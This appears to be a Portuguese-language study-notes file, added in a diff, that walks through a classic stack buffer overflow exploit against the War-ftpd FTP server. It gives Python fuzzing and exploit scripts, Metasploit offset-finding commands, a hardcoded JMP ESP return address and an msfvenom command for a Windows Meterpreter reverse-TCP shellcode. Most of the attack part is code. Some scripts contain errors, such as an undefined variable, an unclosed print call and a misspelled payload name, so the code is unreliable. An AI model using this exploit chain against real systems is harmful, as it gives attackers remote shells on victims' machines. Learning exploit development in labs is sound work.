@@ -1,0 +1,144 @@
+
+    __          ________                                      ______             
+   / /_  __  __/ __/ __/__  _____       ____ _   _____  _____/ __/ /___ _      __
+  / __ \/ / / / /_/ /_/ _ \/ ___/      / __ \ | / / _ \/ ___/ /_/ / __ \ | /| / /
+ / /_/ / /_/ / __/ __/  __/ /         / /_/ / |/ /  __/ /  / __/ / /_/ / |/ |/ / 
+/_.___/\__,_/_/ /_/  \___/_/          \____/|___/\___/_/  /_/ /_/\____/|__/|__/  
+                                                                                 
+
+
+- um buffer é um armazenamento de dados temporario na memoria fisica do computador
+- um buffer overflow acontece quando há a escrita de mais dados do que é suportado num endereço especifico da memória, fazendo com que a adjacente seja sobrescrita
+- eip = registrador que grava um endereço de memória com uma instrução p/ executar
+- esp = registrador em q podemos amarzenar o shellcode
+- fazer o eip apontar para o jmp esp = executa oq está em esp
+- https://www.youtube.com/watch?v=hrjdAv-aHCY
+
+etapas:
+Spiking: Um método que usamos para encontrar uma parte vulnerável de um programa.
+Fuzing: Enviamos um monte de personagens para ver se conseguimos quebrá-lo.
+Encontrando o deslocamento: se o quebramos, queremos descobrir em que ponto o quebramos. Portanto, queremos encontrar o deslocamento.
+Substituindo o EIP: usamos o deslocamento para substituir o EIP, o endereço do ponteiro do qual estamos falando. Se tivermos controle EIP, podemos seguir para a próxima etapa.
+Encontrar personagens ruins:
+Encontrando o Módulo Certo.
+Gerando ShellCode: Criando o código de shell malicioso que nos dá um shell reverso.
+
+Ex: criando exploit em serviço de ftp
+Aplicação: War-ftpd
+
+1. Conectar-se:                                                         2.Fuzzing:
+#!/usr/bin/python                                                       #!/usr/bin/python
+#Explorando aplicação ftp                                               #Fuzzing
+                                               
+import socket                                                           import socket
+                                                     
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                   buffer = ["A"]
+s.connect(("ip alvo", 21))                                              c = 100
+r = s.recv(1024)                                                        while len(buffer) <= 25:
+print(r)                                                                	buffer.append("A" * contador)
+                                                                                c = c + 200
+s.send("USER teste\r\n")
+r = s.recv(1024)                                                        for string in buffer:
+print(r)                                                                	print("Fuzzing com ==> %s bytes"%len(string)
+										s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.send("PASS teste\r\n")							s.connect(("ip alvo", 21))
+r = s.recv(1024)								s.send("USER " + string + "\r\n")
+print(r) 
+
+3.Teste:
+#!/usr/bin/python
+
+import socket
+
+buf = "A" * 1100
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("ip alvo", 21))
+r = s.recv(1024)
+print(r)
+
+s.send("USER " + buf + "\r\n")
+r = s.recv(1024)
+print(r)
+
+Gerar padrão com os bytes necessários para travar a aplicação
+root@shark:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 1100
+
+Atualização do código 3 e localizar EIP:
+#!/usr/bin/python
+
+import socket
+
+buf = "<padrão gerado>"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("ip alvo", 21))
+r = s.recv(1024)
+print(r)
+
+s.send("USER " + buf + "\r\n")
+r = s.recv(1024)
+print(r)
+
+
+5.root@shark:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <EIP>
+
+Atualizando o código 3 novamente:
+#!/usr/bin/python
+
+import socket
+
+buf = "A" * <valor do passo 5> + "B" * 4 + "C" * (1100 - 489)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("ip alvo", 21))
+r = s.recv(1024)
+print(r)
+
+s.send("USER " + buf + "\r\n")
+r = s.recv(1024)
+print(r)
+
+
+6.Proucurar jmp esp nas dlls e buscar endereços e atualizar o codigo 3 mais uma vez
+definir brakpoint on acess no endereço escolhido
+ex: 7C9D313B
+
+#!/usr/bin/python
+
+import socket
+
+buf = "A" * <valor do passo 5> + "\x3b\x31\x9d\x7c" + "C" * (1100 - 489)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("ip alvo", 21))
+r = s.recv(1024)
+print(r)
+
+s.send("USER " + buf + "\r\n")
+r = s.recv(1024)
+print(r)
+
+7.Shell code:
+root@shark:~# msfvenom -p windows/meterpeter/reverse_tcp LHOST=<ip> LPORT=443 -b "\x00\x0a\x0d\x20\x40" -f python
+
+8.Finalmente, o exploit:
+#!/usr/bin/python
+#exploit
+
+import socket
+
+<shell code gerado no passo 7>
+
+buffer = "A" * <valor do passo 5> + "\x3b\x31\x9d\x7c" + "\x90" * (1100 - 489 - len(buf)) + buf
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("ip alvo", 21))
+r = s.recv(1024)
+print(r)
+
+s.send("USER " + buffer + "\r\n")
+r = s.recv(1024)
+print(r)
+
+
